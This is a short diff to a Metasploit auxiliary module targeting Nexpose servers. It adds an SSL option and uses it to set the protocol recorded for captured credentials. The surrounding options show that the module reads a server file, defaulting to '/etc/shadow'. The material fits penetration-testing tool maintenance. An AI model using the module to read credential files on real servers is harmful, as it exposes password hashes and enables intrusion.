@@ -42,12 +42,14 @@ class Metasploit4 < Msf::Auxiliary
 				OptString.new('USERNAME', [true, "The Nexpose user", "user"]),
 				OptString.new('PASSWORD', [true, "The Nexpose password", "pass"]),
 				OptString.new('FILEPATH', [true, "The filepath to read on the server", "/etc/shadow"]),
+				OptBool.new('SSL', [true, 'Use SSL', true])
 			], self.class)
 	end
 
 	def run
 		user = datastore['USERNAME']
 		pass = datastore['PASSWORD']
+		prot = datastore['SSL'] ? 'https' : 'http'
 
 		nsc = Nexpose::Connection.new(rhost, user, pass, rport)
 
@@ -57,7 +59,7 @@ class Metasploit4 < Msf::Auxiliary
 			report_auth_info(
 				:host   => rhost,
 				:port   => rport,
-				:sname  => 'https',
+				:sname  => prot,
 				:user   => user,
 				:pass   => pass,
 				:proof  => '',
